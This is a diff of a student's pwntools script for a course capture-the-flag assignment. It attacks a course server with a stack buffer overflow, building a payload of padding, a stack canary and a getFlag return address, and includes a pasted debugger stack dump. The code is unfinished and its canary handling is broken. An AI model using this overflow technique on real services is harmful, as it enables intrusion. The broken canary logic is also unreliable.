@@ -1,25 +1,72 @@
 #!/usr/bin/python3
 
+# finding the canary:
+# https://ctf101.org/binary-exploitation/stack-canaries/
+# https://bananamafia.dev/post/binary-canary-bruteforce/
+
 from pwn import *
 from pwn import p64
 
-io = remote('inf226.puffling.no', 7003)
-print(io.recvline())
-io.recvuntil(b'1. ')
-io.sendline(cyclic(32)) # receive the prompt, then send 32 A's
 
-r = io.recvline() # is the line received an address of importance? f7f9f600
+try:
+    for i in range(100):
+      io = remote('inf226.puffling.no', 7003)
+      print(io.recvuntil(b'1. '))
+      s = io.sendline(cyclic(32)+b'\n') # receive the prompt, then send 32 A's
+      print(s)
+      '''r = io.recvall().removesuffix(b'. ').decode() # is the line received an address of importance? f7f9f600
+      print(r)'''
+      canary = id(0x7ffff7fb5850)
+      print(canary)
+      
+      
+
+      #r = io.recvall()
+      #prompt = b'1. '
+      #canary_address = r[r.startswith(prompt) and len(prompt):]
+      #canary_address = canary_address.removesuffix(b'. ')
+      #print('canary:', canary_address)
 
 
-# finding the canary:
-# https://ctf101.org/binary-exploitation/stack-canaries/
-canary_address = p64(0x7fffffffdff8) # addr. when getting seg. fault
-getFlag_address = p64(0x4011db) # addr. past pushing to stack
+      # canary_address = p64(0x7fffffffdff8) # addr. when getting seg. fault
+      getFlag_address = 0x4011db # addr. past pushing to stack
 
-# cyclic(62) = b'q' + b'a' * 31
-send = cyclic(62) + getFlag_address 
-io.sendline(send)
-print(io.recvall())
+      # offset + canary + pad to return pointer + return address of getFlag+5
+      send = cyclic(38) + p64(int(canary,16)) #+ cyclic(8) + p64(0x4011db)
+
+      #print(send)
+      #io.sendline(send)
+      '''response = io.recvall(timeout=2)
+      if b'INF226{' in response:
+         print(response)
+         io.close()
+         break
+      io.close()'''
+except EOFError:
+    print('EOFError')
+
+
+'''
+io.send(cyclic(38) + p64(int(canary, 16)) + cyclic(8) + p64(0x40121B)) 
+fordi: offset starter på -0x24, cyclic(8) fordi returadressen til getFlag er på 0x08
+'''
+
+
+
+
+
+'''
+───────────────────────────────────[ STACK ]───────────────────────────────
+00:0000│ rsp 0x7fffffffde90 —▸ 0x7fffffffdff8 —▸ 0x7fffffffe323 ◂— '/home/adneda/Documents/INF226/compulsory_assignments/CA1/03'
+01:0008│     0x7fffffffde98 ◂— 0x100000000
+02:0010│     0x7fffffffdea0 ◂— 0x736c75706d6f632f ('/compuls')
+03:0018│     0x7fffffffdea8 ◂— 0x2
+04:0020│     0x7fffffffdeb0 ◂— 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII'
+05:0028│     0x7fffffffdeb8 ◂— 'CCCCDDDDEEEEFFFFGGGGHHHHIIII'
+06:0030│     0x7fffffffdec0 ◂— 'EEEEFFFFGGGGHHHHIIII'
+07:0038│     0x7fffffffdec8 ◂— 'GGGGHHHHIIII'
+
+'''
 
 
 
